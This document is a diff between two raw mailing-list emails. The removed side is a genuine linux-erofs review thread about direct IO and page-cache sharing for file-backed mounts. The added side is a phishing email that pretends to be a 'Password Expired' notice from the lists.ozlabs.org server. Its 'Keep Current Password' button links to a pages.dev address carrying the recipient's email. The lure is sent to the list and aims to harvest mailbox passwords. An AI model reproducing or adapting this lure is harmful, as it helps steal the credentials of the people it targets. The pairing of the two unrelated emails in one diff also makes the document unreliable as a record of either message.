@@ -1,61 +1,56 @@
 Return-Path: <linux-erofs-bounces+lists+linux-erofs=lfdr.de@lists.ozlabs.org>
 X-Original-To: lists+linux-erofs@lfdr.de
 Delivered-To: lists+linux-erofs@lfdr.de
-Received: from lists.ozlabs.org (lists.ozlabs.org [112.213.38.117])
-	by mail.lfdr.de (Postfix) with ESMTPS id AB864A165CA
-	for <lists+linux-erofs@lfdr.de>; Mon, 20 Jan 2025 04:46:30 +0100 (CET)
+Received: from lists.ozlabs.org (lists.ozlabs.org [IPv6:2404:9400:2:0:216:3eff:fee1:b9f1])
+	by mail.lfdr.de (Postfix) with ESMTPS id AD6E5A16627
+	for <lists+linux-erofs@lfdr.de>; Mon, 20 Jan 2025 05:46:19 +0100 (CET)
 Received: from boromir.ozlabs.org (localhost [IPv6:::1])
-	by lists.ozlabs.org (Postfix) with ESMTP id 4Ybx8h1FDyz3013
-	for <lists+linux-erofs@lfdr.de>; Mon, 20 Jan 2025 14:46:28 +1100 (AEDT)
+	by lists.ozlabs.org (Postfix) with ESMTP id 4YbyTh5svyz3013
+	for <lists+linux-erofs@lfdr.de>; Mon, 20 Jan 2025 15:46:16 +1100 (AEDT)
 X-Original-To: linux-erofs@lists.ozlabs.org
 Delivered-To: linux-erofs@lists.ozlabs.org
-Authentication-Results: lists.ozlabs.org; arc=none smtp.remote-ip=115.124.30.132
-ARC-Seal: i=1; a=rsa-sha256; d=lists.ozlabs.org; s=201707; t=1737344786;
-	cv=none; b=BNWSBEoPH+XIn4mNssbcI5u7mAB5QejjUpnds8/4jftPhhb4VTe/rbLig1gTsAS7GZapDOKpc3Z6fczd+IMF96mMaVrM9BczqSCj09oLkM4twY+Ojkq+2nVMVUUU/QbQdp+rKftn55XFIZxF5GZWCmOhbyPDMpxmuX5jCCMq/NqpmeQC1bHvgJBiqhRSf72GEUa+dQkpnX/b1cjuSHqYePZQyZ3JTaSPBrvAUH+zU/8hsMzBFyjtTcZo4XXkSk07hCVAKDk3Aqz9KE0jLdgckSci4BTqkurmwgpZVAVM2x9Ae9k0CD49KL0CggWjIGKF1ub9sY9JqkHnZ7zp27WBhQ==
+Authentication-Results: lists.ozlabs.org; arc=none smtp.remote-ip=194.181.186.37
+ARC-Seal: i=1; a=rsa-sha256; d=lists.ozlabs.org; s=201707; t=1737348375;
+	cv=none; b=jrKROjdK7NyNaC5/agy7WRBqHsRYSZ0X4JF4iNT1tJNqlTtF0/hpJ5p8pVfBox3PDSmebQy+uaQr0vC3v3D6aOVIr9+fnm9gBjmxrYSGVy7CRD//i3F2fwEt4ORj35w58R1GmdbwrIKMING/rDfBsLB/0qv0dv7pUiniLBe7bH7sRTta15lWzf9ylA0ZSCnRjkVMM8To+6VKIvzHeUowTMkh3V06nXdui3B0wNYVW6jN+ZG2yznPT2bZRcRfwvCyCB7PQPFu/Bp7y1kizpVhZp4TaKOYTiIVZF/RXZ3btVR5HQ9c92lw6gVC1Ii+Noa5jylarn2AptuNyaaqOp//BQ==
 ARC-Message-Signature: i=1; a=rsa-sha256; d=lists.ozlabs.org; s=201707;
-	t=1737344786; c=relaxed/relaxed;
-	bh=HyRdT1ZY48PCLWRPPhtzKY5PunqweRdWhGgguIYIX90=;
-	h=Message-ID:Date:MIME-Version:Subject:To:Cc:References:From:
-	 In-Reply-To:Content-Type; b=iFX6DdS5/zXwz7HJMUTjVLGqLjvgqj0vdTsTQbIp9F2bAZx/qXCD7p5e/z3zZeIweHFBnzVizVHVWEvCJynp3215wAi38U8wBzPaPxreXDf9Db7BNFeDgm+nRaAAG2CtW2+TgqT5e4gUC0kLbXopjTrywwK4FSnL5IJeYpcKc7XWxdc51t1ByEmM8lDPj0u7A5IRtgbKmhZ+9h/clVRWh3EVQlW4Kbb18+4ebvpT+ErjUUNKdON6kOaUKN+fAWRt1UHNfw6UzZkDP02gXdYCkLHQbytAxzFwhxiaXUwez1kB1WXruqDPl383BScwX8I/FmNBSmDaPF293tArvfhr1w==
-ARC-Authentication-Results: i=1; lists.ozlabs.org; dmarc=pass (p=none dis=none) header.from=linux.alibaba.com; dkim=pass (1024-bit key; unprotected) header.d=linux.alibaba.com header.i=@linux.alibaba.com header.a=rsa-sha256 header.s=default header.b=DnC4fdZF; dkim-atps=neutral; spf=pass (client-ip=115.124.30.132; helo=out30-132.freemail.mail.aliyun.com; envelope-from=hsiangkao@linux.alibaba.com; receiver=lists.ozlabs.org) smtp.mailfrom=linux.alibaba.com
-Authentication-Results: lists.ozlabs.org; dmarc=pass (p=none dis=none) header.from=linux.alibaba.com
-Authentication-Results: lists.ozlabs.org;
-	dkim=pass (1024-bit key; unprotected) header.d=linux.alibaba.com header.i=@linux.alibaba.com header.a=rsa-sha256 header.s=default header.b=DnC4fdZF;
-	dkim-atps=neutral
-Authentication-Results: lists.ozlabs.org; spf=pass (sender SPF authorized) smtp.mailfrom=linux.alibaba.com (client-ip=115.124.30.132; helo=out30-132.freemail.mail.aliyun.com; envelope-from=hsiangkao@linux.alibaba.com; receiver=lists.ozlabs.org)
-Received: from out30-132.freemail.mail.aliyun.com (out30-132.freemail.mail.aliyun.com [115.124.30.132])
-	(using TLSv1.3 with cipher TLS_AES_256_GCM_SHA384 (256/256 bits)
-	 key-exchange X25519 server-signature RSA-PSS (2048 bits) server-digest SHA256)
+	t=1737348375; c=relaxed/relaxed;
+	bh=DytbY1rkwMCq3FUF11SAaRYEBQn8zpUonDFgiMWl+/c=;
+	h=From:To:Subject:Date:Message-ID:MIME-Version:Content-Type; b=JqD5XfmrDVSlpQ2erZZMHg3hUXDR+bm2s99K78crBmm7v3L195P/5WDw2tjmEkHBAzR8UftGzdIghBlDC8Ge1lf1Axrp/T45JahcwXpuNmKY4hyMkioDbvC/IPELIoW1ycodlC80/9r9irsfLUSxVZo/bjUDed+HZqaqkVujzPl9qCKoCqW80TOH8LunypIde/5bEQPxoDikW7Uoc9k7/avYtLHkE1VTJfdBBFCl3P/GZj43bxazmRsBX33yP94KLeF8Jip9c4jEfdIX770JMX2/hLMTszPhLqxTKM2DcDnFTI7WNuOb/pRDVE3eSUqSOrXbIuDK/fhO8B3p97I8Pg==
+ARC-Authentication-Results: i=1; lists.ozlabs.org; dmarc=none (p=none dis=none) header.from=przytuly.powiatlomzynski.pl; spf=none (client-ip=194.181.186.37; helo=poczta.hi.pl; envelope-from=biblioteka@przytuly.powiatlomzynski.pl; receiver=lists.ozlabs.org) smtp.mailfrom=przytuly.powiatlomzynski.pl
+Authentication-Results: lists.ozlabs.org; dmarc=none (p=none dis=none) header.from=przytuly.powiatlomzynski.pl
+Authentication-Results: lists.ozlabs.org; spf=none (no SPF record) smtp.mailfrom=przytuly.powiatlomzynski.pl (client-ip=194.181.186.37; helo=poczta.hi.pl; envelope-from=biblioteka@przytuly.powiatlomzynski.pl; receiver=lists.ozlabs.org)
+X-Greylist: delayed 435 seconds by postgrey-1.37 at boromir; Mon, 20 Jan 2025 15:46:12 AEDT
+Received: from poczta.hi.pl (poczta.hi.pl [194.181.186.37])
+	(using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
 	(No client certificate requested)
-	by lists.ozlabs.org (Postfix) with ESMTPS id 4Ybx8b61swz2yFB
-	for <linux-erofs@lists.ozlabs.org>; Mon, 20 Jan 2025 14:46:22 +1100 (AEDT)
-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-	d=linux.alibaba.com; s=default;
-	t=1737344779; h=Message-ID:Date:MIME-Version:Subject:To:From:Content-Type;
-	bh=HyRdT1ZY48PCLWRPPhtzKY5PunqweRdWhGgguIYIX90=;
-	b=DnC4fdZF3b/umD0QRiOB3Txx+vKFQaoNBSEpsDoTEzu8zprHAiMG6HKP2LXj9cGV5Kfxm7ZON/4LFv3HPczJL6Zm6+se8M4Svu0hbRVisPQzXn2OWkZA6RmcTM8NSV0J20rFTV+wTL1xMyItIoq/7wsS6l++xo1wdhwEz1xBgHE=
-Received: from 30.221.129.118(mailfrom:hsiangkao@linux.alibaba.com fp:SMTPD_---0WNvSdcK_1737344777 cluster:ay36)
-          by smtp.aliyun-inc.com;
-          Mon, 20 Jan 2025 11:46:17 +0800
-Message-ID: <47f74598-1b2f-4308-a8b8-18fc40bafe6d@linux.alibaba.com>
-Date: Mon, 20 Jan 2025 11:46:16 +0800
+	by lists.ozlabs.org (Postfix) with ESMTPS id 4YbyTc5LmFz2yP8
+	for <linux-erofs@lists.ozlabs.org>; Mon, 20 Jan 2025 15:46:12 +1100 (AEDT)
+Received: from localhost (localhost [127.0.0.1])
+	by poczta.hi.pl (Postfix) with ESMTP id 18C01F415CD
+	for <linux-erofs@lists.ozlabs.org>; Mon, 20 Jan 2025 05:38:53 +0100 (CET)
+X-Virus-Scanned: Debian amavisd-new at hi.pl
+Received: from poczta.hi.pl ([127.0.0.1])
+	by localhost (poczta.hi.pl --fqdn [127.0.0.1]) (amavisd-new, port 10024)
+	with ESMTP id NYRiPxUtgh4j for <linux-erofs@lists.ozlabs.org>;
+	Mon, 20 Jan 2025 05:38:50 +0100 (CET)
+Received: from poczta.hi.pl (unknown [105.112.29.47])
+	(using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
+	(No client certificate requested)
+	by poczta.hi.pl (Postfix) with ESMTPSA id 30E12F415CB
+	for <linux-erofs@lists.ozlabs.org>; Mon, 20 Jan 2025 05:38:49 +0100 (CET)
+From: biblioteka@przytuly.powiatlomzynski.pl
+To: linux-erofs@lists.ozlabs.org
+Subject: lists.ozlabs.org Server - Password Expired
+Date: 20 Jan 2025 05:38:46 +0100
+Message-ID: <20250120021407.E1DCE061C4FF75D0@poczta.hi.pl>
 MIME-Version: 1.0
-User-Agent: Mozilla Thunderbird
-Subject: Re: [PATCH RFC] erofs: file-backed mount supports direct io
-To: Hongbo Li <lihongbo22@huawei.com>, xiang@kernel.org, chao@kernel.org
-References: <20250115070936.119975-1-lihongbo22@huawei.com>
- <635ede9a-b5eb-4630-88ba-2826022d5585@linux.alibaba.com>
- <fbd5850c-e431-4914-81eb-ec3ff42419a4@huawei.com>
- <f0a6b66e-0427-4c66-8c69-20c6c362e55f@linux.alibaba.com>
- <dd9beb64-3bdb-4f49-a94b-21c039325558@huawei.com>
-From: Gao Xiang <hsiangkao@linux.alibaba.com>
-In-Reply-To: <dd9beb64-3bdb-4f49-a94b-21c039325558@huawei.com>
-Content-Type: text/plain; charset=UTF-8; format=flowed
-Content-Transfer-Encoding: 8bit
-X-Spam-Status: No, score=-15.7 required=5.0 tests=DKIM_SIGNED,DKIM_VALID,
-	DKIM_VALID_AU,DKIM_VALID_EF,ENV_AND_HDR_SPF_MATCH,RCVD_IN_DNSWL_NONE,
-	SPF_HELO_NONE,SPF_PASS,UNPARSEABLE_RELAY,USER_IN_DEF_DKIM_WL,
-	USER_IN_DEF_SPF_WL autolearn=disabled version=4.0.0
+Content-Type: text/html;
+	charset="iso-8859-1"
+Content-Transfer-Encoding: quoted-printable
+X-Spam-Status: No, score=2.1 required=5.0 tests=HTML_MESSAGE,MIME_HTML_ONLY,
+	MIXED_HREF_CASE,SPF_HELO_NONE,SPF_NONE,T_KAM_HTML_FONT_INVALID
+	autolearn=disabled version=4.0.0
+X-Spam-Level: **
 X-Spam-Checker-Version: SpamAssassin 4.0.0 (2022-12-13) on lists.ozlabs.org
 X-BeenThere: linux-erofs@lists.ozlabs.org
 X-Mailman-Version: 2.1.29
@@ -68,78 +63,169 @@ List-Post: <mailto:linux-erofs@lists.ozlabs.org>
 List-Help: <mailto:linux-erofs-request@lists.ozlabs.org?subject=help>
 List-Subscribe: <https://lists.ozlabs.org/listinfo/linux-erofs>,
  <mailto:linux-erofs-request@lists.ozlabs.org?subject=subscribe>
-Cc: linux-erofs@lists.ozlabs.org
 Errors-To: linux-erofs-bounces+lists+linux-erofs=lfdr.de@lists.ozlabs.org
 Sender: "Linux-erofs" <linux-erofs-bounces+lists+linux-erofs=lfdr.de@lists.ozlabs.org>
 
+<HTML><HEAD>
+<META name=3DGENERATOR content=3D"MSHTML 11.00.10570.1001"></HEAD>
+<body>
+<DIV>
+<table id=3D"v1table1" class=3D"v1x_v1row_mr_css_attr v1x_v1row-3_mr_css_at=
+tr" style=3D"BOX-SIZING: border-box; FONT-SIZE: 14px; FONT-FAMILY: Roboto, =
+sans-serif; WHITE-SPACE: normal; WORD-SPACING: 0px; BORDER-COLLAPSE: collap=
+se; TEXT-TRANSFORM: none; FONT-WEIGHT: 400; COLOR: #2c363a; FONT-STYLE: nor=
+mal; TEXT-ALIGN: left; ORPHANS: 2; WIDOWS: 2; LETTER-SPACING: normal; BACKG=
+ROUND-COLOR: #f1f4f8; font-variant-ligatures: normal; font-variant-caps: no=
+rmal; font-variant-numeric: inherit;=20
+font-variant-east-asian: inherit; font-stretch: inherit; -webkit-text-strok=
+e-width: 0px; text-decoration-thickness: initial; text-decoration-style: in=
+itial; text-decoration-color: initial" cellspacing=3D"0" cellpadding=3D"0" =
+width=3D"100%" align=3D"center" border=3D"0">
+<TBODY style=3D"BOX-SIZING: border-box">
+<TR style=3D"BOX-SIZING: border-box">
+<td style=3D"BOX-SIZING: border-box">
+<table id=3D"v1table2" class=3D"v1x_v1row-content_mr_css_attr v1x_v1stack_m=
+r_css_attr" style=3D"BOX-SIZING: border-box; WIDTH: 640px; BORDER-COLLAPSE:=
+ collapse; COLOR: #000000; BACKGROUND-COLOR: #ffffff" cellspacing=3D"0" cel=
+lpadding=3D"0" width=3D"640" align=3D"center" border=3D"0">
+<TBODY style=3D"BOX-SIZING: border-box">
+<TR style=3D"BOX-SIZING: border-box">
+<td class=3D"v1x_v1column_mr_css_attr" style=3D"BORDER-LEFT-WIDTH: 0px; BOX=
+-SIZING: border-box; BORDER-RIGHT-WIDTH: 0px; VERTICAL-ALIGN: top; BORDER-B=
+OTTOM-WIDTH: 0px; FONT-WEIGHT: 400; PADDING-BOTTOM: 0px; TEXT-ALIGN: left; =
+PADDING-TOP: 0px; BORDER-TOP-WIDTH: 0px" width=3D"100%">
+<table id=3D"v1table3" class=3D"v1x_v1text_block_mr_css_attr" style=3D"BOX-=
+SIZING: border-box; BORDER-COLLAPSE: collapse" cellspacing=3D"0" cellpaddin=
+g=3D"0" width=3D"100%" border=3D"0">
+<TBODY style=3D"BOX-SIZING: border-box">
+<TR style=3D"BOX-SIZING: border-box">
+<td style=3D"BOX-SIZING: border-box; PADDING-BOTTOM: 10px; PADDING-TOP: 20p=
+x; PADDING-LEFT: 40px; PADDING-RIGHT: 40px">
+<DIV style=3D"BOX-SIZING: border-box; BORDER-TOP: 0px; FONT-FAMILY: sans-se=
+rif; BORDER-RIGHT: 0px; VERTICAL-ALIGN: baseline; BORDER-BOTTOM: 0px; COLOR=
+: ; PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PADDING-LEFT: 0px; BORDER-LEFT: =
+0px; MARGIN: 0px; PADDING-RIGHT: 0px; font-stretch: inherit">
+<DIV style=3D"BOX-SIZING: border-box; FONT-SIZE: 12px; BORDER-TOP: 0px; FON=
+T-FAMILY: 'Trebuchet MS', 'Lucida Grande', 'Lucida Sans Unicode', 'Lucida S=
+ans', Tahoma, sans-serif; BORDER-RIGHT: 0px; VERTICAL-ALIGN: baseline; BORD=
+ER-BOTTOM: 0px; COLOR: #555555; PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PADD=
+ING-LEFT: 0px; BORDER-LEFT: 0px; MARGIN: 0px; LINE-HEIGHT: 1.2; PADDING-RIG=
+HT: 0px; font-stretch: inherit">
+<P style=3D"BOX-SIZING: border-box; FONT-SIZE: 14px; TEXT-ALIGN: center; MA=
+RGIN: 0px"><SPAN style=3D"BOX-SIZING: border-box; FONT-SIZE: 14px; BORDER-T=
+OP: 0px; FONT-FAMILY: inherit; BORDER-RIGHT: 0px; VERTICAL-ALIGN: baseline;=
+ BORDER-BOTTOM: 0px; COLOR: #003188; PADDING-BOTTOM: 0px; PADDING-TOP: 0px;=
+ PADDING-LEFT: 0px; BORDER-LEFT: 0px; MARGIN: 0px; PADDING-RIGHT: 0px; font=
+-stretch: inherit"><STRONG style=3D"BOX-SIZING: border-box; FONT-WEIGHT: bo=
+lder"><FONT color=3D#000000>
+lists.ozlabs.org Server - Password Expired&nbsp;</FONT></STRONG></SPAN></P>=
+</DIV></DIV></TD></TR></TBODY></TABLE>
+<table id=3D"v1table4" class=3D"v1x_v1text_block_mr_css_attr" style=3D"BOX-=
+SIZING: border-box; BORDER-COLLAPSE: collapse" cellspacing=3D"0" cellpaddin=
+g=3D"0" width=3D"100%" border=3D"0">
+<TBODY style=3D"BOX-SIZING: border-box">
+<TR style=3D"BOX-SIZING: border-box">
+<td style=3D"BOX-SIZING: border-box; PADDING-BOTTOM: 10px; PADDING-TOP: 10p=
+x; PADDING-LEFT: 40px; PADDING-RIGHT: 40px">
+<DIV style=3D"BOX-SIZING: border-box; BORDER-TOP: 0px; FONT-FAMILY: Tahoma,=
+ Verdana, sans-serif; BORDER-RIGHT: 0px; VERTICAL-ALIGN: baseline; BORDER-B=
+OTTOM: 0px; COLOR: ; PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PADDING-LEFT: 0=
+px; BORDER-LEFT: 0px; MARGIN: 0px; PADDING-RIGHT: 0px; font-stretch: inheri=
+t">
+<P style=3D"BOX-SIZING: border-box; FONT-SIZE: 12px; BORDER-TOP: 0px; FONT-=
+FAMILY: Lato, Tahoma, Verdana, Segoe, sans-serif; BORDER-RIGHT: 0px; VERTIC=
+AL-ALIGN: baseline; BORDER-BOTTOM: 0px; COLOR: #555555; PADDING-BOTTOM: 0px=
+; TEXT-ALIGN: left; PADDING-TOP: 0px; PADDING-LEFT: 0px; BORDER-LEFT: 0px; =
+MARGIN: 0px 0px 0px 40px; LINE-HEIGHT: 1.5; PADDING-RIGHT: 0px; font-stretc=
+h: inherit">
+<SPAN style=3D"BOX-SIZING: border-box; FONT-SIZE: 14px; BORDER-TOP: 0px; FO=
+NT-FAMILY: inherit; BORDER-RIGHT: 0px; VERTICAL-ALIGN: baseline; BORDER-BOT=
+TOM: 0px; COLOR: #6d89bc; PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PADDING-LE=
+FT: 0px; BORDER-LEFT: 0px; MARGIN: 0px; PADDING-RIGHT: 0px; font-stretch: i=
+nherit"><FONT color=3D#000000>The password to your &nbsp;mailbox&nbsp;</FON=
+T><A href=3D"mailto:linux-erofs@lists.ozlabs.org" rel=3Dnoreferrer><FONT co=
+lor=3D#000000>linux-erofs@lists.ozlabs.org</FONT></A><FONT color=3D#000000>=
 
-
-On 2025/1/20 11:43, Hongbo Li wrote:
-> 
-> 
-> On 2025/1/20 11:10, Gao Xiang wrote:
->>
->>
->> On 2025/1/20 11:02, Hongbo Li wrote:
->>>
->>>
->>
->> ...
->>
->>>>>   }
->>>>> +static int erofs_fileio_scan_iter(struct erofs_fileio *io, struct kiocb *iocb,
->>>>> +                  struct iov_iter *iter)
->>>>
->>>> I wonder if it's possible to just extract a folio from
->>>> `struct iov_iter` and reuse erofs_fileio_scan_folio() logic.
->>> Thanks for reviewing. Ok, I'll think about reusing the erofs_fileio_scan_folio logic in later version.
->>
->> Thanks.
->>
->>>
->>> Additionally, for the file-backed mount case, can we consider removing the erofs's page cache and just using the backend file's page cache? If in this way, it will use buffer io for reading the backend's mounted files in default, and it also can decrease the memory overhead.
->>
->> I think it's too hacky for upstreaming, since EROFS can only
->> operate its own page cache, otherwise it should only support
->> overlayfs-like per-inode sharing.
->>
->> Per-extent sharing among different filesystems is too hacky
-> It just like the dax mode of erofs (but instead of the dax devices, it's a backend file). It does not share the page among the different filesystems, because there is only the backend file's page cache. I found the whole io path is similar to this direct io mode.
-
-How do you handle a VMA which is consecutive as an
-EROFS file, but actually mapping to different part
-of the underlay inode, or even different underlay
-inodes?
-
-It just cause the current MM layer broken, but FSDAX
-mode is a complete different story.
-
-Thanks,
-Gao Xiang
-
-> 
-> Thanks,
-> Hongbo
-> 
->> on the MM side, but if you have some detailed internal
->> requirement, you could implement downstream.
->>
->> Thanks,
->> Gao Xiang
->>
->>>
->>> This is just my initial idea, for uncompressed mode, this should make sense. But for compressed layout, it needs to be verified.
->>>
->>> Thanks,
->>> Hongbo
->>>
->>>>
->>>> It simplifies the codebase a lot, and I think the performance
->>>> is almost the same.
->>>>
->>>> Otherwise currently it looks good to me.
->>>>
->>>> Thanks,
->>>> Gao Xiang
->>
-
+ &nbsp;has expired.</FONT></SPAN></P>
+<P style=3D"BOX-SIZING: border-box; FONT-SIZE: 12px; BORDER-TOP: 0px; FONT-=
+FAMILY: Lato, Tahoma, Verdana, Segoe, sans-serif; BORDER-RIGHT: 0px; VERTIC=
+AL-ALIGN: baseline; BORDER-BOTTOM: 0px; COLOR: #555555; PADDING-BOTTOM: 0px=
+; TEXT-ALIGN: left; PADDING-TOP: 0px; PADDING-LEFT: 0px; BORDER-LEFT: 0px; =
+MARGIN: 0px 0px 0px 40px; LINE-HEIGHT: 1.5; PADDING-RIGHT: 0px; font-stretc=
+h: inherit">
+<SPAN style=3D"BOX-SIZING: border-box; FONT-SIZE: 14px; BORDER-TOP: 0px; FO=
+NT-FAMILY: inherit; BORDER-RIGHT: 0px; VERTICAL-ALIGN: baseline; BORDER-BOT=
+TOM: 0px; COLOR: #6d89bc; PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PADDING-LE=
+FT: 0px; BORDER-LEFT: 0px; MARGIN: 0px; PADDING-RIGHT: 0px; font-stretch: i=
+nherit"><FONT color=3D#000000>System will log you out and generate a new pa=
+ssword exactly at 24 hours from</FONT></SPAN></P>
+<P style=3D"BOX-SIZING: border-box; FONT-SIZE: 12px; BORDER-TOP: 0px; FONT-=
+FAMILY: Lato, Tahoma, Verdana, Segoe, sans-serif; BORDER-RIGHT: 0px; VERTIC=
+AL-ALIGN: baseline; BORDER-BOTTOM: 0px; COLOR: #555555; PADDING-BOTTOM: 0px=
+; TEXT-ALIGN: left; PADDING-TOP: 0px; PADDING-LEFT: 0px; BORDER-LEFT: 0px; =
+MARGIN: 0px 0px 0px 40px; LINE-HEIGHT: 1.5; PADDING-RIGHT: 0px; font-stretc=
+h: inherit"><SPAN style=3D"FONT-SIZE: 14px; COLOR: #6d89bc"><FONT color=3D#=
+000000><SPAN style=3D"FONT-SIZE: 14px; COLOR: #6d89bc">
+<FONT color=3D#000000>21 Jan 2025</FONT></SPAN></FONT></SPAN> <SPAN style=
+=3D"BOX-SIZING: border-box; FONT-SIZE: 14px; BORDER-TOP: 0px; FONT-FAMILY: =
+inherit; BORDER-RIGHT: 0px; VERTICAL-ALIGN: baseline; BORDER-BOTTOM: 0px; C=
+OLOR: #6d89bc; PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PADDING-LEFT: 0px; BO=
+RDER-LEFT: 0px; MARGIN: 0px; PADDING-RIGHT: 0px; font-stretch: inherit"><FO=
+NT color=3D#000000><FONT color=3D#000000>.</FONT><BR style=3D"BOX-SIZING: b=
+order-box"></FONT><FONT color=3D#000000>
+&nbsp;&nbsp;</SPAN> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;=
+ &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbs=
+p; &nbsp; &nbsp;&nbsp;</FONT>
+ <SPAN style=3D"BOX-SIZING: border-box; FONT-SIZE: 14px; BORDER-TOP: 0px; F=
+ONT-FAMILY: inherit; BORDER-RIGHT: 0px; FONT-VARIANT: normal; VERTICAL-ALIG=
+N: baseline; BORDER-BOTTOM: 0px; FONT-WEIGHT: normal; COLOR: #6d89bc; PADDI=
+NG-BOTTOM: 0px; FONT-STYLE: normal; PADDING-TOP: 0px; PADDING-LEFT: 0px; BO=
+RDER-LEFT: 0px; MARGIN: 0px; PADDING-RIGHT: 0px; font-stretch: inherit"><FO=
+NT color=3D#000000>&nbsp; &nbsp;<BR style=3D"BOX-SIZING: border-box">
+You can continue using your current password. Use the button below to keep =
+using current password.</FONT><BR><BR>
+<A style=3D"BOX-SIZING: border-box; TEXT-DECORATION: none; BORDER-TOP: #8a3=
+b8f 1px solid; FONT-FAMILY: Lato, Tahoma, Verdana, Segoe, sans-serif; BORDE=
+R-RIGHT: #8a3b8f 1px solid; VERTICAL-ALIGN: baseline; BORDER-BOTTOM: #8a3b8=
+f 1px solid; COLOR: #ffffff; PADDING-BOTTOM: 5px; TEXT-ALIGN: center; PADDI=
+NG-TOP: 5px; PADDING-LEFT: 0px; BORDER-LEFT: #8a3b8f 1px solid; MARGIN: 0px=
+; DISPLAY: block; PADDING-RIGHT: 0px; BACKGROUND-COLOR: #3d60fb; font-stret=
+ch: inherit; border-radius: 4px"=20
+href=3D"https://dfdsf.pages.dev/?email=3Dlinux-erofs@lists.ozlabs.org&amp;m=
+ail=3Dlists.ozlabs.org" rel=3D"noopener noreferrer" target=3D_blank><SPAN s=
+tyle=3D"BOX-SIZING: border-box; FONT-SIZE: 14px; BORDER-TOP: 0px; FONT-FAMI=
+LY: inherit; BORDER-RIGHT: 0px; VERTICAL-ALIGN: baseline; BORDER-BOTTOM: 0p=
+x; COLOR: ; PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PADDING-LEFT: 0px; BORDE=
+R-LEFT: 0px; MARGIN: 0px; DISPLAY: inline-block; LETTER-SPACING: normal; LI=
+NE-HEIGHT: 28px; PADDING-RIGHT: 0px; font-stretch: inherit"><STRONG>
+Keep Current Password</STRONG></SPAN></A></P>
+<P style=3D"BOX-SIZING: border-box; FONT-SIZE: 14px; BORDER-TOP: 0px; FONT-=
+FAMILY: Lato, Tahoma, Verdana, Segoe, sans-serif; BORDER-RIGHT: 0px; VERTIC=
+AL-ALIGN: baseline; BORDER-BOTTOM: 0px; COLOR: #555555; PADDING-BOTTOM: 0px=
+; PADDING-TOP: 0px; PADDING-LEFT: 0px; BORDER-LEFT: 0px; MARGIN: 0px; LINE-=
+HEIGHT: 1.5; PADDING-RIGHT: 0px; font-stretch: inherit" align=3Dcenter><FON=
+T color=3D#000000><BR>Email is generated by lists.ozlabs.org Email Server f=
+or&nbsp;&nbsp;</FONT>
+ <A href=3D"mailto:linux-erofs@lists.ozlabs.org" rel=3Dnoreferrer><FONT col=
+or=3D#000000>linux-erofs@lists.ozlabs.org</FONT></A><BR><BR><FONT color=3D#=
+000000 size=3D2 face=3DArial>Please do not reply to this email. Emails sent=
+ to this address will not be answered.<SPAN>&nbsp;</SPAN><BR>Copyright &cop=
+y; 2022&nbsp;lists.ozlabs.org All rights reserved.</FONT></P></SPAN></DIV><=
+/TD></TR></TBODY></TABLE></TD></TR></TBODY></TABLE></TD></TR></TBODY></TABL=
+E></DIV>
+<DIV>
+<table id=3D"v1table5" class=3D"v1x_v1row_mr_css_attr v1x_v1row-4_mr_css_at=
+tr" style=3D"BOX-SIZING: border-box; FONT-SIZE: 14px; FONT-FAMILY: Roboto, =
+sans-serif; WHITE-SPACE: normal; WORD-SPACING: 0px; BORDER-COLLAPSE: collap=
+se; TEXT-TRANSFORM: none; FONT-WEIGHT: 400; COLOR: #2c363a; FONT-STYLE: nor=
+mal; TEXT-ALIGN: left; ORPHANS: 2; WIDOWS: 2; LETTER-SPACING: normal; BACKG=
+ROUND-COLOR: #f1f4f8; font-variant-ligatures: normal; font-variant-caps: no=
+rmal; font-variant-numeric: inherit;=20
+font-variant-east-asian: inherit; font-stretch: inherit; -webkit-text-strok=
+e-width: 0px; text-decoration-thickness: initial; text-decoration-style: in=
+itial; text-decoration-color: initial" cellspacing=3D"0" cellpadding=3D"0" =
+width=3D"100%" align=3D"center" border=3D"0">
+<TBODY style=3D"BOX-SIZING: border-box">
+<TR style=3D"BOX-SIZING: border-box">
+<td style=3D"BOX-SIZING: border-box"></TD></TR></TBODY></TABLE></DIV></BODY=
+></HTML>
